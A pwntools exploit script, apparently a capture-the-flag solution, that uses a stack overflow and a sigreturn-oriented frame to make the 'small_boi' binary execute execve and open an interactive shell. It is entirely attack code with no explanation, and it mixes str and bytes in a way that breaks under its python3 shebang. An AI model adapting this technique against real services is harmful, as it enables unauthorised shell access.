#!/usr/bin/env python3

from pwn import *

exe = ELF("./small_boi")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    frame = SigreturnFrame(arch = "amd64")
    frame.rip = 0x400185
    frame.rax = 0x3b
    frame.rdi = 0x4001ca
    frame.rsi = 0
    frame.rdx = 0

    r.sendline("A" * 0x28 + p64(0x40017c) + str(frame)[8:])

    r.interactive()


if __name__ == "__main__":
    main()
